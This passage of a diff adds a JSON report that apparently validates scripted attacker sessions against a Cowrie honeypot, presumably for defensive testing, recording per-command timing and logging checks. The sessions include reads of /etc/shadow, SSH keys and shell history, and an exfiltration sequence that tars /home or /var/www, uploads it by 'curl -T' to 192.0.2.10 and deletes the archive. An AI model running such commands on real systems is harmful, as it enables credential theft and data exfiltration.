+          "readiness_reason": "prompt",
+          "prompt_match": "www-data@svr04:/$ ",
+          "output_chars": 57,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "ls -la",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "www-data@svr04:/$ ",
+          "output_chars": 1372,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "find / -name id_rsa 2>/dev/null",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 13.344,
+          "readiness_reason": "prompt",
+          "prompt_match": "www-data@svr04:/$ ",
+          "output_chars": 50,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 304,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 34,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 683,
+          "password_leaks": [],
+          "redacted_markers": 5
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 57,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 1372,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 50,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 2553
+    },
+    {
+      "session": "2d000ec0f6a4",
+      "profile": "privilege_escalation",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 19.7,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "id",
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "cat /etc/shadow",
+        "cat /etc/crontab",
+        "ls -la"
+      ],
+      "commands_sent": [
+        "id",
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "cat /etc/shadow",
+        "cat /etc/crontab",
+        "ls -la"
+      ],
+      "cowrie_command_input": [
+        "id",
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "cat /etc/shadow",
+        "cat /etc/crontab",
+        "ls -la",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "id",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "guest@svr04:~$ ",
+          "output_chars": 69,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "sudo -l",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "guest@svr04:~$ ",
+          "output_chars": 680,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "find / -perm -4000 -type f 2>/dev/null",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "guest@svr04:~$ ",
+          "output_chars": 54,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "cat /etc/shadow",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "guest@svr04:~$ ",
+          "output_chars": 781,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "cat /etc/crontab",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "guest@svr04:~$ ",
+          "output_chars": 32,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 6,
+          "command": "ls -la",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "guest@svr04:~$ ",
+          "output_chars": 117,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 301,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 69,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 680,
+          "password_leaks": [],
+          "redacted_markers": 5
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 54,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 781,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 32,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 6,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 117,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 2095
+    },
+    {
+      "session": "7182e8369178",
+      "profile": "lateral_movement",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 10.7,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "arp -a",
+        "cat ~/.bash_history",
+        "ping -c 2 192.0.2.5",
+        "ls -la ~/.ssh"
+      ],
+      "commands_sent": [
+        "arp -a",
+        "cat ~/.bash_history",
+        "ping -c 2 192.0.2.5",
+        "ls -la ~/.ssh"
+      ],
+      "cowrie_command_input": [
+        "arp -a",
+        "cat ~/.bash_history",
+        "ping -c 2 192.0.2.5",
+        "ls -la ~/.ssh",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [
+        "arp -a"
+      ],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "arp -a",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:~$ ",
+          "output_chars": 52,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "cat ~/.bash_history",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:~$ ",
+          "output_chars": 83,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "ping -c 2 192.0.2.5",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:~$ ",
+          "output_chars": 76,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "ls -la ~/.ssh",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:~$ ",
+          "output_chars": 91,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 301,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 52,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 83,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 76,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 91,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 640
+    },
+    {
+      "session": "c8b5283b1b5a",
+      "profile": "lateral_movement",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 6.5,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "cat /etc/hosts",
+        "cat ~/.ssh/config"
+      ],
+      "commands_sent": [
+        "cat /etc/hosts",
+        "cat ~/.ssh/config"
+      ],
+      "cowrie_command_input": [
+        "cat /etc/hosts",
+        "cat ~/.ssh/config",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "cat /etc/hosts",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "svc_backup@svr04:~$ ",
+          "output_chars": 219,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "cat ~/.ssh/config",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "svc_backup@svr04:~$ ",
+          "output_chars": 84,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 306,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 219,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 84,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 638
+    },
+    {
+      "session": "e0043f9fb00e",
+      "profile": "data_exfiltration",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 19.9,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "find /home -name '*.db' 2>/dev/null",
+        "tar cf /dev/shm/d.tar /var/www",
+        "curl -T /dev/shm/d.tgz http://192.0.2.10/u",
+        "rm -f /dev/shm/d.tgz /dev/shm/d.tar"
+      ],
+      "commands_sent": [
+        "find /home -name '*.db' 2>/dev/null",
+        "tar cf /dev/shm/d.tar /var/www",
+        "curl -T /dev/shm/d.tgz http://192.0.2.10/u",
+        "rm -f /dev/shm/d.tgz /dev/shm/d.tar"
+      ],
+      "cowrie_command_input": [
+        "find /home -name '*.db' 2>/dev/null",
+        "tar cf /dev/shm/d.tar /var/www",
+        "curl -T /dev/shm/d.tgz http://192.0.2.10/u",
+        "rm -f /dev/shm/d.tgz /dev/shm/d.tar",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "find /home -name '*.db' 2>/dev/null",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "backup@svr04:~$ ",
+          "output_chars": 52,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "tar cf /dev/shm/d.tar /var/www",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "backup@svr04:~$ ",
+          "output_chars": 224,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "curl -T /dev/shm/d.tgz http://192.0.2.10/u",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "backup@svr04:~$ ",
+          "output_chars": 154,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "rm -f /dev/shm/d.tgz /dev/shm/d.tar",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "backup@svr04:~$ ",
+          "output_chars": 52,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 302,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 52,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 224,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 154,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 52,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 829
+    },
+    {
+      "session": "76bdccf353a3",
+      "profile": "data_exfiltration",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 15.3,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "find /home -name '*.db' 2>/dev/null",
+        "du -sh /home /var/www",
+        "tar czf /var/tmp/d.tgz /home",
+        "curl -T /var/tmp/d.tgz http://192.0.2.10/u",
+        "rm -f /var/tmp/d.tgz /var/tmp/d.tar"
+      ],
+      "commands_sent": [
+        "find /home -name '*.db' 2>/dev/null",
+        "du -sh /home /var/www",
+        "tar czf /var/tmp/d.tgz /home",
+        "curl -T /var/tmp/d.tgz http://192.0.2.10/u",
+        "rm -f /var/tmp/d.tgz /var/tmp/d.tar"
+      ],
+      "cowrie_command_input": [
+        "find /home -name '*.db' 2>/dev/null",
+        "du -sh /home /var/www",
+        "tar czf /var/tmp/d.tgz /home",
+        "curl -T /var/tmp/d.tgz http://192.0.2.10/u",
+        "rm -f /var/tmp/d.tgz /var/tmp/d.tar",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "find /home -name '*.db' 2>/dev/null",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 50,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "du -sh /home /var/www",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 46,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "tar czf /var/tmp/d.tgz /home",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 220,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "curl -T /var/tmp/d.tgz http://192.0.2.10/u",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 152,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "rm -f /var/tmp/d.tgz /var/tmp/d.tar",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 50,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 300,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 50,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 46,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 220,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 152,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 50,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 871
+    }
+  ],
+  "wrong_guess_sessions": [
+    {
+      "session": "93b080cf409e",
+      "profile": "benign_admin",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "a65d4df4a1e5",
+      "profile": "reconnaissance",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "1a98cc96903c",
+      "profile": "reconnaissance",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "5c98af782477",
+      "profile": "brute_force",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "e1ec0c141cdd",
+      "profile": "brute_force",
+      "manifest_index": 1,
+      "attempt": 2,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "739c886d276e",
+      "profile": "brute_force",
+      "manifest_index": 1,
+      "attempt": 3,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "869fc867a5b1",
+      "profile": "brute_force",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "580789b7ceba",
+      "profile": "brute_force",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "a547a315de07",
+      "profile": "brute_force",
+      "manifest_index": 2,
+      "attempt": 3,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "4bf3ec64ffec",
+      "profile": "botnet",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "dbbae982eac4",
+      "profile": "botnet",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "1241d657f9ea",
+      "profile": "privilege_escalation",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "d340fbae9963",
+      "profile": "lateral_movement",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    },
+    {
+      "session": "00499366e839",
+      "profile": "data_exfiltration",
+      "manifest_index": 2,
+      "attempt": 1,
+      "cowrie_login": "failed",
+      "cowrie_duration_s": 1.1,
+      "final_event": "cowrie.session.closed",
+      "manifest_outcome": "rejected"
+    }
+  ]
+}
